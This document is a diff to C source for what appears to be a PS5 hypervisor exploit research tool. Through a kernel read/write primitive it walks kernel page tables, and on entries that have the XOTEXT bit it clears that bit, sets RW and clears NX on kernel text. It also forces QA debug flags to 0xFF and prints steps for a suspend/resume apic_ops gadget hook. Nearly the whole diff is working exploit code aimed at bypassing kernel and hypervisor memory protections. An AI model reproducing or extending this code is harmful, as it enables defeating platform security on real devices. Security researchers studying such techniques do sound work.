@@ -4572,8 +4572,8 @@ static void campaign_flatz_setup(void) {
         return;
     }
 
-    /* ─── Phase 6a: Clear XOTEXT on ktext guest PTEs ─── */
-    printf("[*] Phase 6a: Clearing XOTEXT on ktext guest page table entries\n");
+    /* ─── Phase 6a: Diagnose ktext PTEs + QA flags approach ─── */
+    printf("[*] Phase 6a: ktext page table analysis + XOTEXT/QA flags\n");
     printf("    ktext base: 0x%lx\n", (unsigned long)g_ktext_base);
     fflush(stdout);
 
@@ -4584,17 +4584,19 @@ static void campaign_flatz_setup(void) {
     uint64_t ktext_scan_size = 0x2000000;  /* 32MB */
     uint64_t ktext_end = g_ktext_base + ktext_scan_size;
 
-    int pte_modified = 0;
-    int pde_modified = 0;
-    int huge_pages = 0;
-    int giant_pages = 0;
-    int unmapped = 0;
-
     /*
-     * Walk page tables for each 4KB page in ktext range.
-     * For 2MB huge pages, modify the PDE and advance by 2MB.
-     * For 1GB giant pages, modify the PDPE and advance by 1GB.
+     * Step 1: Dump the first 8 PDE/PTE entries for ktext to understand
+     * the page mapping structure and which bits are set.
      */
+    printf("\n[*] Dumping ktext page table entries (first 8 regions):\n");
+    int diag_count = 0;
+    int total_2mb_pages = 0;
+    int total_4kb_pages = 0;
+    int total_unmapped = 0;
+    int total_xotext = 0;
+    int total_rw = 0;
+    int total_nx = 0;
+
     for (uint64_t va = g_ktext_base; va < ktext_end && va >= g_ktext_base; ) {
         uint64_t pml4_idx = (va >> 39) & 0x1FF;
         uint64_t pdp_idx  = (va >> 30) & 0x1FF;
@@ -4602,86 +4604,257 @@ static void campaign_flatz_setup(void) {
         uint64_t pt_idx   = (va >> 12) & 0x1FF;
 
         /* PML4E */
-        uint64_t pml4e;
+        uint64_t pml4e = 0;
         kernel_copyout(g_dmap_base + g_cr3_phys + pml4_idx * 8, &pml4e, 8);
         if (!(pml4e & PTE_PRESENT)) {
-            unmapped++;
+            total_unmapped++;
             va += 0x1000;
             continue;
         }
 
         /* PDPE */
         uint64_t pdpe_pa = (pml4e & PTE_PA_MASK) + pdp_idx * 8;
-        uint64_t pdpe;
+        uint64_t pdpe = 0;
         kernel_copyout(g_dmap_base + pdpe_pa, &pdpe, 8);
         if (!(pdpe & PTE_PRESENT)) {
-            unmapped++;
+            total_unmapped++;
             va += 0x1000;
             continue;
         }
         if (pdpe & PTE_PS) {
-            /* 1GB giant page - modify PDPE */
-            if (pdpe & PTE_BIT_XOTEXT) {
-                pdpe &= ~PTE_BIT_XOTEXT;
-                pdpe |= PTE_BIT_RW;
-                pdpe &= ~PTE_BIT_NX;
-                kernel_copyin(&pdpe, g_dmap_base + pdpe_pa, 8);
-                giant_pages++;
+            /* 1GB giant page */
+            if (diag_count < 8) {
+                printf("    VA 0x%lx: 1GB PDPE=0x%016lx P=%d RW=%d NX=%d bit58=%d\n",
+                       (unsigned long)va, (unsigned long)pdpe,
+                       (int)(pdpe & 1), (int)((pdpe >> 1) & 1),
+                       (int)(pdpe >> 63), (int)((pdpe >> 58) & 1));
+                diag_count++;
             }
+            if (pdpe & PTE_BIT_XOTEXT) total_xotext++;
+            if (pdpe & PTE_BIT_RW) total_rw++;
+            if (pdpe & PTE_BIT_NX) total_nx++;
             va = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
             continue;
         }
 
         /* PDE */
         uint64_t pde_pa = (pdpe & PTE_PA_MASK) + pd_idx * 8;
-        uint64_t pde;
+        uint64_t pde = 0;
         kernel_copyout(g_dmap_base + pde_pa, &pde, 8);
         if (!(pde & PTE_PRESENT)) {
-            unmapped++;
+            total_unmapped++;
             va += 0x1000;
             continue;
         }
         if (pde & PTE_PS) {
-            /* 2MB huge page - modify PDE */
-            if (pde & PTE_BIT_XOTEXT) {
-                pde &= ~PTE_BIT_XOTEXT;
-                pde |= PTE_BIT_RW;
-                pde &= ~PTE_BIT_NX;
-                kernel_copyin(&pde, g_dmap_base + pde_pa, 8);
-                pde_modified++;
-                huge_pages++;
+            /* 2MB huge page */
+            total_2mb_pages++;
+            if (diag_count < 8) {
+                printf("    VA 0x%lx: 2MB PDE=0x%016lx P=%d RW=%d NX=%d bit58=%d\n",
+                       (unsigned long)va, (unsigned long)pde,
+                       (int)(pde & 1), (int)((pde >> 1) & 1),
+                       (int)(pde >> 63), (int)((pde >> 58) & 1));
+                diag_count++;
             }
+            if (pde & PTE_BIT_XOTEXT) total_xotext++;
+            if (pde & PTE_BIT_RW) total_rw++;
+            if (pde & PTE_BIT_NX) total_nx++;
             va = (va + (1ULL << 21)) & ~((1ULL << 21) - 1);
             continue;
         }
 
         /* PTE (4KB page) */
         uint64_t pte_pa = (pde & PTE_PA_MASK) + pt_idx * 8;
-        uint64_t pte;
+        uint64_t pte = 0;
         kernel_copyout(g_dmap_base + pte_pa, &pte, 8);
         if (!(pte & PTE_PRESENT)) {
-            unmapped++;
+            total_unmapped++;
             va += 0x1000;
             continue;
         }
 
-        if (pte & PTE_BIT_XOTEXT) {
-            pte &= ~PTE_BIT_XOTEXT;
-            pte |= PTE_BIT_RW;
-            pte &= ~PTE_BIT_NX;
-            kernel_copyin(&pte, g_dmap_base + pte_pa, 8);
-            pte_modified++;
+        total_4kb_pages++;
+        if (diag_count < 8) {
+            printf("    VA 0x%lx: 4KB PTE=0x%016lx P=%d RW=%d NX=%d bit58=%d\n",
+                   (unsigned long)va, (unsigned long)pte,
+                   (int)(pte & 1), (int)((pte >> 1) & 1),
+                   (int)(pte >> 63), (int)((pte >> 58) & 1));
+            diag_count++;
         }
+        if (pte & PTE_BIT_XOTEXT) total_xotext++;
+        if (pte & PTE_BIT_RW) total_rw++;
+        if (pte & PTE_BIT_NX) total_nx++;
         va += 0x1000;
     }
 
-    printf("[+] XOTEXT clearing complete:\n");
-    printf("    PDEs modified (2MB pages): %d\n", pde_modified);
-    printf("    PTEs modified (4KB pages): %d\n", pte_modified);
-    printf("    Giant pages (1GB):         %d\n", giant_pages);
-    printf("    Huge pages (2MB):          %d\n", huge_pages);
-    printf("    Unmapped pages skipped:    %d\n", unmapped);
-    printf("    Total modified: %d\n", pde_modified + pte_modified + giant_pages);
+    printf("\n[*] ktext page table summary (32MB scan):\n");
+    printf("    2MB huge pages:     %d\n", total_2mb_pages);
+    printf("    4KB pages:          %d\n", total_4kb_pages);
+    printf("    Unmapped:           %d\n", total_unmapped);
+    printf("    XOTEXT bit set:     %d\n", total_xotext);
+    printf("    RW bit set:         %d\n", total_rw);
+    printf("    NX bit set:         %d\n", total_nx);
+    fflush(stdout);
+
+    /*
+     * Step 2: Clear XOTEXT (bit 58) + set RW + clear NX on any entries
+     * that have XOTEXT set.  On FW 4.03 this may find 0 entries if
+     * XOM is enforced purely via NPT.
+     */
+    int pte_modified = 0, pde_modified = 0;
+
+    if (total_xotext > 0) {
+        printf("\n[*] Clearing XOTEXT on %d entries...\n", total_xotext);
+        for (uint64_t va = g_ktext_base; va < ktext_end && va >= g_ktext_base; ) {
+            uint64_t pml4e = 0;
+            kernel_copyout(g_dmap_base + g_cr3_phys + ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
+            if (!(pml4e & PTE_PRESENT)) { va += 0x1000; continue; }
+
+            uint64_t pdpe_pa = (pml4e & PTE_PA_MASK) + ((va >> 30) & 0x1FF) * 8;
+            uint64_t pdpe = 0;
+            kernel_copyout(g_dmap_base + pdpe_pa, &pdpe, 8);
+            if (!(pdpe & PTE_PRESENT)) { va += 0x1000; continue; }
+            if (pdpe & PTE_PS) {
+                if (pdpe & PTE_BIT_XOTEXT) {
+                    pdpe &= ~PTE_BIT_XOTEXT; pdpe |= PTE_BIT_RW; pdpe &= ~PTE_BIT_NX;
+                    kernel_copyin(&pdpe, g_dmap_base + pdpe_pa, 8);
+                    pde_modified++;
+                }
+                va = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
+                continue;
+            }
+
+            uint64_t pde_pa = (pdpe & PTE_PA_MASK) + ((va >> 21) & 0x1FF) * 8;
+            uint64_t pde = 0;
+            kernel_copyout(g_dmap_base + pde_pa, &pde, 8);
+            if (!(pde & PTE_PRESENT)) { va += 0x1000; continue; }
+            if (pde & PTE_PS) {
+                if (pde & PTE_BIT_XOTEXT) {
+                    pde &= ~PTE_BIT_XOTEXT; pde |= PTE_BIT_RW; pde &= ~PTE_BIT_NX;
+                    kernel_copyin(&pde, g_dmap_base + pde_pa, 8);
+                    pde_modified++;
+                }
+                va = (va + (1ULL << 21)) & ~((1ULL << 21) - 1);
+                continue;
+            }
+
+            uint64_t pte_pa = (pde & PTE_PA_MASK) + ((va >> 12) & 0x1FF) * 8;
+            uint64_t pte = 0;
+            kernel_copyout(g_dmap_base + pte_pa, &pte, 8);
+            if (pte & PTE_PRESENT && pte & PTE_BIT_XOTEXT) {
+                pte &= ~PTE_BIT_XOTEXT; pte |= PTE_BIT_RW; pte &= ~PTE_BIT_NX;
+                kernel_copyin(&pte, g_dmap_base + pte_pa, 8);
+                pte_modified++;
+            }
+            va += 0x1000;
+        }
+        printf("[+] Cleared: %d PDEs, %d PTEs\n", pde_modified, pte_modified);
+    } else {
+        printf("\n[!] No XOTEXT bits found in guest PTEs.\n");
+        printf("    FW 4.03 enforces XOM purely via HV Nested Page Tables.\n");
+        printf("    Guest PTE manipulation alone cannot disable XOM.\n");
+    }
+    fflush(stdout);
+
+    /*
+     * Step 3: QA/Security flags analysis.
+     *
+     * IMPORTANT CONTEXT (from fw403-hv-attack-surface-analysis.md):
+     *   FW <= 2.70: QA flags shared between HV and kernel, NOT
+     *               reinitialized on resume.  Setting SL debug flag
+     *               + sleep/wake → ktext readable+writable.
+     *   FW >= 3.00: QA flags REINITIALIZED on resume by secure loader.
+     *               Sleep/wake trick no longer works.
+     *               Guest PTE XOTEXT clearing has no NPT effect.
+     *
+     * We still dump and set QA flags to verify this experimentally.
+     * The SDK provides kernel_set_qaflags()/kernel_get_qaflags()
+     * which handle the FW-specific offset automatically.
+     */
+    printf("\n[*] Step 3: QA/Security flags (experimental verification)\n");
+    printf("    NOTE: QA flags are REINITIALIZED on resume on FW >= 3.00.\n");
+    printf("    This test verifies whether that patch holds on FW 4.03.\n\n");
+
+    /* Read current QA flags via SDK API */
+    uint8_t qa_before[16] = {0};
+    if (kernel_get_qaflags(qa_before) == 0) {
+        printf("[*] QA_FLAGS (via SDK, KERNEL_ADDRESS_QA_FLAGS):\n");
+        printf("    Current: ");
+        for (int i = 0; i < 16; i++) printf("%02x ", qa_before[i]);
+        printf("\n");
+    } else {
+        printf("[-] kernel_get_qaflags() failed\n");
+    }
+
+    /* Read security flags */
+    if (KERNEL_ADDRESS_SECURITY_FLAGS) {
+        uint8_t secflags[16] = {0};
+        kernel_copyout(KERNEL_ADDRESS_SECURITY_FLAGS, secflags, 16);
+        printf("[*] SECURITY_FLAGS:\n");
+        printf("    Current: ");
+        for (int i = 0; i < 16; i++) printf("%02x ", secflags[i]);
+        printf("\n");
+    }
+    fflush(stdout);
+
+    /*
+     * Step 4: Set QA flags with SL debug bit.
+     *
+     * QA flags layout (16 bytes, from PS5 SDK / community research):
+     *   Byte 0, bit 1 (0x02): System Level (SL) debug flag
+     *     When set, HV constructs NPT without xotext/write-protect
+     *     on kernel .text pages.
+     *
+     * We set bytes 0-1 to 0xFF to enable all QA features.
+     * Then attempt suspend/resume to see if the HV reads them.
+     *
+     * On FW >= 3.00: The secure loader should reinitialize these
+     * flags during resume, nullifying our changes.  But we test
+     * this experimentally to confirm.
+     */
+    uint8_t qa_new[16];
+    memcpy(qa_new, qa_before, 16);
+    /* Set first two bytes to 0xFF to enable all QA features */
+    qa_new[0] = 0xFF;
+    qa_new[1] = 0xFF;
+
+    int qa_changed = 0;
+    for (int i = 0; i < 16; i++) {
+        if (qa_new[i] != qa_before[i]) { qa_changed = 1; break; }
+    }
+
+    if (qa_changed) {
+        printf("\n[*] Setting QA flags (enabling all debug features)...\n");
+        printf("    Before: ");
+        for (int i = 0; i < 16; i++) printf("%02x ", qa_before[i]);
+        printf("\n");
+        printf("    Target: ");
+        for (int i = 0; i < 16; i++) printf("%02x ", qa_new[i]);
+        printf("\n");
+
+        if (kernel_set_qaflags(qa_new) == 0) {
+            /* Verify */
+            uint8_t qa_verify[16] = {0};
+            kernel_get_qaflags(qa_verify);
+            printf("    After:  ");
+            for (int i = 0; i < 16; i++) printf("%02x ", qa_verify[i]);
+            printf("\n");
+
+            int match = 1;
+            for (int i = 0; i < 16; i++) {
+                if (qa_verify[i] != qa_new[i]) { match = 0; break; }
+            }
+            if (match) {
+                printf("[+] QA flags set successfully!\n");
+            } else {
+                printf("[-] QA flags write did not persist (may be protected)\n");
+            }
+        } else {
+            printf("[-] kernel_set_qaflags() failed\n");
+        }
+    } else {
+        printf("\n[*] QA flags already have debug bits set.\n");
+    }
     fflush(stdout);
 
     /* ─── Phase 6b: Test ktext readability + gadget scan ─── */
@@ -4720,15 +4893,40 @@ static void campaign_flatz_setup(void) {
     printf("\n");
 
     if (!ktext_readable) {
-        printf("\n[!] ktext is still EXECUTE-ONLY (NPT enforced)\n");
-        printf("[!] XOTEXT cleared in guest PTEs, but NPT not yet updated.\n");
-        printf("[!] To continue the flatz method:\n");
-        printf("    1. Put PS5 in REST MODE (Settings > Power > Rest Mode)\n");
-        printf("    2. Wake PS5 from rest mode\n");
-        printf("    3. Re-run exploit + hv_research.elf\n");
-        printf("    4. Phase 6b will detect readable ktext and scan for gadgets\n");
-        printf("\n");
-        notify("[HV Research] XOTEXT cleared! Enter REST MODE, then re-run.");
+        printf("\n[!] ktext is still EXECUTE-ONLY (NPT enforced by HV)\n");
+        if (total_xotext > 0) {
+            printf("[*] XOTEXT found in %d guest PTEs (unexpected on 4.03!)\n",
+                   total_xotext);
+        } else {
+            printf("[*] No XOTEXT in guest PTEs — XOM is purely NPT-based.\n");
+        }
+
+        /* Re-read QA flags to show current state */
+        uint8_t qa_check[16] = {0};
+        if (kernel_get_qaflags(qa_check) == 0) {
+            printf("[*] QA flags now: ");
+            for (int i = 0; i < 16; i++) printf("%02x ", qa_check[i]);
+            printf("\n");
+        }
+
+        printf("\n[*] EXPERIMENTAL: Try suspend/resume to test QA flags persistence.\n");
+        printf("    On FW >= 3.00, the secure loader reinitializes QA flags on\n");
+        printf("    resume (documented as patched).  But we test empirically:\n");
+        printf("    1. QA flags set to 0xFF above\n");
+        printf("    2. Put PS5 in REST MODE (Settings > Power > Rest Mode)\n");
+        printf("    3. Wake PS5 + re-run exploit + hv_research.elf\n");
+        printf("    4. Check if ktext becomes readable (unlikely on FW 4.03)\n");
+        printf("\n[*] ALTERNATIVE APPROACH: apic_ops hook with known gadgets.\n");
+        printf("    Since ktext can't be scanned, gadget addresses must come\n");
+        printf("    from external sources (FW 4.03 kernel dump, static analysis).\n");
+        printf("    apic_ops[2] is CONFIRMED WRITABLE (Phase 5 proved this).\n");
+        printf("    If a 'ret' gadget address is known, we can test the hook:\n");
+        printf("      1. Write ret_addr to apic_ops[2] via DMAP\n");
+        printf("      2. Trigger suspend/resume\n");
+        printf("      3. cpususpend_handler calls xapic_mode → our ret gadget\n");
+        printf("      4. System resumes → hook fired!\n\n");
+
+        notify("[HV Research] Phase 6: QA flags set. Try REST MODE or provide gadget offsets.");
         fflush(stdout);
         return;
     }
